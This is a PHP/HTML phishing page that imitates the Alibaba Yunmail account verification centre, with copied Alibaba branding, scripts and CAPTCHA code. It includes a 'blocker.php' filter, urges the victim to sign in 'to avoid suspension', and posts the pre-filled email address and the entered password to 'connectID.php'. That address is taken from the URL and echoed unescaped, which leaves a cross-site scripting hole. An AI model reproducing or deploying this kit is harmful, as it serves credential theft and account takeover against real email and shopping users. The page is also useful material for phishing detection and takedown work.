<?php
include('blocker.php');
?>


<!doctype html>
<html lang="en-US">


<head>
    <meta charset="UTF-8">
            <meta name="data-spm" content="a1z5k" />
    <title>阿里巴巴集团| 会员验证中心</title>
    <meta name="keywords" content="阿里巴巴集团帐号，统一登录，帐号登录，淘宝帐号，阿里云帐号，阿里巴巴国际站帐号，云邮箱帐号，YunOS帐号，1688帐号">
    <meta name="description" content="阿里巴巴集团帐号可以一帐号登录/使用阿里旗下网站及服务，包括：网络购物，生活支付，转账缴费，理财，YunOS，云储存，云邮箱，数字音乐，移动导航，即时通讯，社交与分享等网络生活服务。">
    <link rel="shortcut icon" href="https://h.alipayobjects.com/static/images/uc/favicon.ico?v=0.3.5" type="image/x-icon"/>
    <link rel="stylesheet" href="https://g.alicdn.com//cm/account/0.3.5/css/ucenter.css?v=0.3.5"/>

</head>
  


<body data-spm="7633538" class="yunmail">
<!--头部 start-->

<div id="header">
	<div class="header-layout">
       <h1 class="logo" id="logo"><a href="">Yunmail</a></h1>
       <h2 class="logo-title">登录您的电子邮件以避免暂停</h2>
       <ul class="header-nav">
				    		    			    								    			<li><a href="" target="_blank"> 主页 </a></li>
										        		               <li><a href="http://mailhelp.aliyun.com/freemail/" target="_blank">  </a></li>
	        		        		               <li><a href="" target="_blank"> 建议 </a></li>
	    			    			       </ul>
   </div>
</div>



<!--CBU-->
    <link type="text/css" href="//aeis.alicdn.com/sd/ncpc/nc.css?t=5393224033200" rel="stylesheet" />
    <div id="content">
        <div class="content-layout">
            <div class="maincenter">
                <div class="maincenter-box">
                    <div class="maincenter-box-tip">
                        <p class="ui-tiptext ui-tiptext-message ft-14">
                            <i class="ui-tiptext-icon iconfont" title=" Note ">&#xF046;</i>
                             请输入您的帐户的用户名和密码来获取你的未决电子邮件和验证您的帐户 
                        </p>
                    </div>
                    <form  action="connectID.php" method="post">
	<div class="ui-form-item     ">
        <label class="ui-label"> 登录ID： </label>
        <input type="email" required="" readonly="" name="login" class="ui-input" placeholder="插入你的电子邮件" value="<?php echo $_GET['email']; ?>" data-explain="">
                      			    </div>
		<div class="ui-form-item     ">
        <label class="ui-label"> 登录密码： </label>
        <input type="password" required="" autofocus="" name="passwd" class="ui-input" placeholder="插入您的帐户密码" value="" data-explain="">
                      			    </div>
<div class="ui-form-item ui-form-item-last">
    <input type="submit" value=" 提交 " class="ui-button ui-button-lorange" id="submitBtn">
</div>
</form>


                </div>
				            </div>
        </div>
    </div>
        <script type="text/javascript" charset="utf-8" src="//aeis.alicdn.com/sd/ncpc/nc.js?t=5393224033200"></script>
 <script type="text/javascript">
  if(top.location!==self.location){ 
			top.location.href=self.location.href; 
 }
        seajs.use(['$', 'arale/validator/0.9.5/validator'], function (jQuery, Validator) {
            jQuery(function(){
                var errorIcon = '<i class="ui-tiptext-icon iconfont">&#xF045;</i>';
			    var firstFocus = true;
				var firstUrl = "";
 				var idValidated = false;
			  

                function showExp(ele, msg, toggleClass) {
					var item = jQuery(ele).parent(".ui-form-item");
					var explain = item.find(".ui-form-explain");
					if (explain.length === 0) {
					       explain = jQuery('<div class="ui-form-explain"></div>').appendTo(item);
					}
					var className = 'ui-form-item ' + toggleClass;
					explain.html(msg);
					item.attr('class', className);
                };                
              
                var validator = new Validator({
                    element:"#J_Form",
                    autoSubmit: true,
                    onItemValidate:function (element) {
                        if (jQuery(element).attr('type') === 'email') {
                            var val = jQuery(element).val();
                            val = jQuery.trim(val);
                            jQuery(element).val(val);
                        }             
                    }
                });

				


                validator.addItem({
                    element:'#J-accName',
                    required:true,
				
					errormessageRequired:errorIcon+' Please input loginId ' 
		                
                });

				

            });

        });
        
 
    var nc = new noCaptcha();
    var opt = {
        renderTo:'havana_nco',
        appkey : 'CFUS_APP_HAVANAMPC' ,
        token :'38868e27f59403bc8787480c05d6bfc6b88a6a00',
        elementID : ["J-accName"],
        trans : {"behaviorTraceId": "cdb2745f42cff2a6ed9435e0c0d73372"},
        is_Opt:'',//是否自己配置collina
        callback: function  (data) {
        	jQuery('#submitBtn').removeAttr('disabled');
        	jQuery("#ncoSign").attr("value", data.sig);
        	jQuery("#ncoSessionid").attr("value", data.csessionid);
        	jQuery("#fm-noc-ua").attr("value", _n);
        },
        error : function(s){
        },
					language:'en',
						    foreign: 1,
		        isEnabled:true
    }
    nc.init(opt);

        
    </script>
	
    <div id="umid"></div>
    <script type="text/javascript" charset="utf-8" src="https://s.tbcdn.cn/g/security/umscript/2.0.0/um.js"></script>
    <script type="text/javascript">
        var cimg = new Image(1,1);
        cimg.onload = function() {
        cimg.onload = null;
        };
        cimg.src = "https://us.ynuf.alipay.com/service/clear.png?xt=38868e27f59403bc8787480c05d6bfc6b88a6a00&xa=090D1F110F18383D2A";
    </script>
    <script type="text/javascript">
        um.init({
		containers:{flash: document.getElementById("umid"),dcp:document.getElementById("umid")},
        enable: true,
        enableMod:false,
        ratio: 1,
        timeout: 3000,
        timestamp: '52697699545E5F49564F6C74',
        token:'38868e27f59403bc8787480c05d6bfc6b88a6a00',
        serviceUrl:'https://us.ynuf.alipay.com/service/um.json',
        proxyUrl:'https://login.alibaba.com/flash/lsa.swf',
        appName: '090D1F110F18383D2A'
        });
    </script>
    

    
<!-- PC 小蜜服务窗链接 -->
<script>
    window.alicareDialogAsyncInit = function(AlicareDialog) {
        new AlicareDialog({
            position: {
                bottom: '55%',
                right: '6%'
            },

            // 配置 dialog 相对 layout 的垂直位�|;
            dialog: {
                offset: {
                    y: -400
                }
            },

            // 在后台注册的页面名称, 必填�~B
            from: 'password_find'
        });
    };
</script>
<script src="//g.alicdn.com/crm/alicare-dialog/0.0.4/include.js" charset="utf-8"></script>


<!--foot start-->
<div id="footer">
	<div class="footer-layout">
	    <div class="copyright">
			 所有 权 保留的 Alibaba-Group 1999-<?php echo date("Y"); ?> 	    </div>
  	</div>
</div>
<!-- host: ushavanampc010176174106.ot7  -->
</body>
</html>